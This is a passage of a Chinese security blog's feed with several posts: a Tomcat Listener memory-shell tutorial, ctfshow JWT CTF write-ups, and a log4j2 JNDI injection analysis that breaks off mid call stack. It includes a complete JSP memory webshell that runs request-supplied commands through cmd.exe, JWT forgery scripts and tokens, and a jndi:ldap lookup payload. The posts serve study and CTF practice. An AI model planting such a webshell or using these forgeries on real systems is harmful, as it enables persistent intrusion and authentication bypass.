db5c8e1d82e2d600bbf46381d806c4e5999b1e02d162c8a6be84d0c0bf8b9b594e60efea83da317af7beee35d487d90ae1d2c35702528a36e760e047ad7468fc870ebfb00e46272634915faf76e7b8c3cb00cb6c97e83968bc3992ec8b177ccd0a750302927efc70d888b253bea2a2a10312ecf56d056f4a29bf534caab29a9dd0717fefbc772811b51e34b481ad0aeb94e2f7549af5ffdaf92461394a74b13fbac185d9b240c6b0b77ddd6b0c2d29d44e6378045cc02065815a5a105a7c39db0c75ac2cc9c6373116969cabb170bc6b709caac3a8148e6027c0d7712ad8f68209e045dfa8803371b89b11c39249bdd343fd4c0da389f433e9deee8d30e3c058889e9ddc64a0e3077c2125ccae85b1e6a5621261b084c160a1161b952d0e8786f59fc690f61083274a6cce974d18162cac3bf2a79aaccd809b10d2a62ade859a4fb2eb9ca91e14d8bdee988bf327ea458a132f5e579d1ec0c933a4b79efa70778c02c88595b65a4c0e949af2a9c060592d0453e1690b542281c8825b0b7536cb7b2c8cee17cc4d627c323e27c7e5fff9d846b36e91c2f66721afcc7b248d648017733a8a0d30dae28da5dc43121a2a2fc15321dcf5f50f6216200195017807596a53c78714a5a86945cf188f01652130dc62eedec5beabb1549f28b9f619de0d015a65a96c311f9103bfea9c28e4c5e2645cf76fad8809210605eb78b336a0345634c76cba0fb21d4b6f80eb9a23f5c183f696df2791df7742fc04ccadd59b200a4d6d00aa7912ef87e853edf9c3aa57b3a041723873a4ef48d453a9ba0e5666405976e64705dfec19c9efdf881d346a89f856328e1291a2f727035c2fbb0da0d2a6f54735354370e87d51e27ffa57d3290b95049b94611c30592f496dd0bfdedebadb50ce70a4e111224023c14a86f7322baed6e616288800871e3432ae5a05c02d9d7299f33bb1b0f21e87315cfd340f274d8971c34dd5d5339b405f2712beb8458cf600f05891dd02e00d5843517df04af3bff18804974748c5c329979f49b0187b5faf0e4dc550db190e2634e577873580c8259365b90b5da240390a12ba1173f05bc16115b73799cec3d3c408e3b06a3f4a313e4242bd1b9233a7b65a55a3d72e407bee8749bc2fb0cc7caee2a43e5fc28e9875225fb1795fffdf2bf467456bb0546e9ed80e1e4cdc175dbe5305d0afbb6474bd9b9f692f4722bfb4974f4164211fd5ef854cc489188c49ceb190440c95c14313c448bff64a81b33a86be9003bcd47dd83b174533131de2b029b9a0b0258201fa2f7e59cf25adc4cbb3c97d70756ad6c8e1a4a6d8c425d53784082111a499221c19aaae2a4dd56680986a8c9f817adfbd74ad18f804771eb59c9a783b260a77f4f1c4930a520cd3c280b002072e93180871fce31347bd7d17a4e8880fd86e9546b756d14b61fb2b771a6ae238b6f755f8a21e9bdcdb76d5e502d80191951d8358f8a7f1491d0b54b28a34b7866173acbdf4fae4a7037229d101edb22720f4d96d716f3ae2d048a785c021a691c1e76a13532ea7873ef4907c48a777577b0ac16ff763de736b9493f4ee29bf84fbef0f126409623dab9a9b5cabf7a515d84e990e8984aa2a89b898765fe2e5bd3feb092dccd663b62a352484a5e57b2a6c4f99f5ea75c8c4c0e20db962afc952f7d7bbce454f7cbeae6c28e8b5fa8277efc840e306cf61b59c2ee0a02b18d3e0547825c6b38c3c8be5b5491cac58a349b6fd6fdf248a688fdf0d5d180d00f6f97c6259a4ff544246fe030f953310bf8ebb519879ddc4cd3cf8b94a4453a69e8cb56b983564f3c0a087d94c52d1a1485f421a0a95a9c9c1f594097d3f38c9ed5cdc7488a47383ad74f5acac812732e1f6f2d4744374519219696da718f91d0fa4dee5cdd0b6c6db2a1d84869ace225d4d793b6618ea00c193d630b0fc575da084a333535c729791318c056921398dceecdc91fc101ac0cb011e97a6211bd4d77a72fb9c99deb605d71959c2e7f8c6286e3fd8cdfbf79ff13cc20ae8086a6778d4aabb765332afc4617c48b950ba8bee79bc434bd5fe5157850916a29d3037a3fdea6976995c96a7c6024aaaec257b92c5a01f14fe3647d5fc41e2ca3665028bd8a314191834ae3caa2b4f7a5159f95ea1236e0a4a79d0e57364ddb841fe83c8c273c40fcdaa8873493225c312f9de4339876996a4aafe52ca68a97480923a4be5769f8daa37cdc613d2ea8886bca5f987d7af09f36615363f86c0c71a2890bf34f30441ad46d28d6b29864de06fa26dc9b4ce11101225d095422b76954249c1eacf7a100f1c9e0b570d1e1abd891cdfb7b5c34cbd46ff171b7463ce0ea1cd1b84a8592e6c7ea91a3b89f0a572428077f1030e0ee04daf015b881e52766eb18f1532be9e1f9afe55e35fd7cf974c2c2b4687f4007c09def3719474d29e16946b139f59f6228eb4c16fd3b37b7f9eced61d301cf69e306e0e87137cd129658ea83340a54649970c7bae193b4dfb4fb6b79139d77611c20293e5498a7322a501fa259f9a1c398e101af</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Listener内存马</title>
    <url>/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>讲解Listener内存马原理，和简单实现<br><span id="more"></span></p>
<h2 id="Listener加载原理"><a href="#Listener加载原理" class="headerlink" title="Listener加载原理"></a>Listener加载原理</h2><p><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>还是这张图，Listener是在最开始就被创建的</p>
<p>Listener一共有8个监听器接口，但是由于内存马的特殊性，一般是在ServletRequestListener接口进行内存马注入，该接口用于监听 ServletRequest 对象的创建和销毁过程，而每次访问服务器都会触发此接口</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>前期准备可以看看Filter内存马的文章</p>
<p>先写一个Listener的容器，实现了ServletRequestListener接口，用注解的方式进行注册<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了TestListener requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在requestInitialized处打上断点，根据调用栈，可以知道是<code>context.fireRequestInitEvent(request.getRequest())</code>进行了初始化<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p>
<p>context是由<code>request.getContext();</code>初始化，在后续利用需要<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt></p>
<p>进入<code>context.fireRequestInitEvent</code>函数，可以看到是由listener进行了监听器初始化，且listener来源于<code>getApplicationEventListeners();</code><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt></p>
<h2 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>通过上面的分析，我们可以知道，只需要往applicationEventListenersList中加入我们的Listener对象就可以了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdl&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">aELL</span> <span class="operator">=</span> context.getClass().getDeclaredField(<span class="string">&quot;applicationEventListenersList&quot;</span>);</span><br><span class="line">    aELL.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">List</span> <span class="variable">applicationEventListenersList</span> <span class="operator">=</span> (List)aELL.get(context);</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listenerDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    applicationEventListenersList.add(listenerDemo);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>根据前面的分析，context是由<code>request.getContext();</code>得到的，所以写内存马的时候也可以通过同样的方式获取</p>
<p>增加applicationEventListenersList，这里我是通过反射的方式获取到了private属性的applicationEventListenersList，然后进行了一次add<br>当然也可以通过context提供的成员方法进行修改<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(listenerDemo);</span><br></pre></td></tr></table></figure></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://xz.aliyun.com/t/10358">https://xz.aliyun.com/t/10358</a></li>
</ul>
]]></content>
      <categories>
        <category>内存马</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-jwt</title>
    <url>/2022/12/05/ctfshow-jwt/</url>
    <content><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>jwt一共有三部分</p>
<ul>
<li>header</li>
<li>payload</li>
<li>signature<span id="more"></span>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header</span><br><span class="line">&#123;</span><br><span class="line">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class="line">  &#x27;alg&#x27;: &#x27;HS256&#x27;  // 加密算法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature</span><br><span class="line">由前面两部分base64加密后用.连接并进行header中声明的方式去加密</span><br></pre></td></tr></table></figure>
<p>jwt就是上面三个通过.进行连接<br>jwt解密网站<br><a href="https://jwt.io/">https://jwt.io/</a></p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>通过base64解码得到的cookie<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJ1c2VyIiwianRpIjoiOTVhZDIwMzA1NTY2NmE2ZDBhZjBiY2M2NDc5OTMwYmIifV0</code><br>得到<br><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1670187851,&quot;exp&quot;:1670195051,&quot;nbf&quot;:1670187851,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;95ad203055666a6d0af0bcc6479930bb&quot;&#125;]</code><br>将user改成admin以后在进行加密<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJhZG1pbiIsImp0aSI6Ijk1YWQyMDMwNTU2NjZhNmQwYWYwYmNjNjQ3OTkzMGJiIn1d</code><br>并用此cookie去访问/admin，就行了</p>
<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>通过 <a href="https://jwt.io/">https://jwt.io/</a> 进行解密<br>修改为admin后，猜测密钥是123456，并重新加密<br><img src="/2022/12/05/ctfshow-jwt/1.jpg" alt></p>
<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>与web346相同，密钥也相同</p>
<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>通过脚本爆破<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<h2 id="we349"><a href="#we349" class="headerlink" title="we349"></a>we349</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>由get的路由，可以知道通过private.key对jwt进行加密<br>我们访问/private.key，拿到私钥<br>通过python进行加密<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install pyjwt</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br><span class="line"><span class="comment"># eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</span></span><br></pre></td></tr></table></figure></p>
<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert,<span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>+err);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这里只能获取到public.key，这时候可以更改RS256为HS256，在后端进行校验的时候就会使用HS256进行验证，且我们知道密钥为public.key<br>利用nodejs进行加密，保证版本相同<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://blog.csdn.net/miuzzx/article/details/111936737">https://blog.csdn.net/miuzzx/article/details/111936737</a></li>
<li><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>jwt</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2 分析</title>
    <url>/2023/03/08/log4j2-%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实我总感觉这应该不属于漏洞，应该是他们的正常功能，只不过恰好可以被当成漏洞来用<br><a href="https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup">https://logging.apache.org/log4j/log4j-2.7/manual/lookups.html#JndiLookup</a><br>官网也有相关的介绍，虽然这些是写到配置文件里面的<br><span id="more"></span></p>
<h2 id="前期配置"><a href="#前期配置" class="headerlink" title="前期配置"></a>前期配置</h2><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="trustURLCodebase"><a href="#trustURLCodebase" class="headerlink" title="trustURLCodebase"></a>trustURLCodebase</h3><p>因为漏洞核心是lookup参数可控，那么就属于jndi注入，需要低版本jdk，或者开启trustURLCodebase<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>));</span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="literal">true</span>)); </span><br></pre></td></tr></table></figure><br>当然也可以利用本地gadget，这属于jndi注入的知识，这里不做过多讨论</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(test.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.fatal(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1/exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">lookup:172, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:344, 